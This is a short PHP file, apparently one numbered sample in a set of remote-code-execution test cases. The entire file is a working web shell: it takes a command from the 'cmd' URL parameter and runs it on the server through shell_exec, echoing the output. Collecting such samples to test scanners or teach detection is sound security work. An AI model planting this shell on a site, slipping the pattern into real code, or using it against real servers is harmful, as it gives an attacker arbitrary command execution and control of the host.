<?php
// RCE test variation #509
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>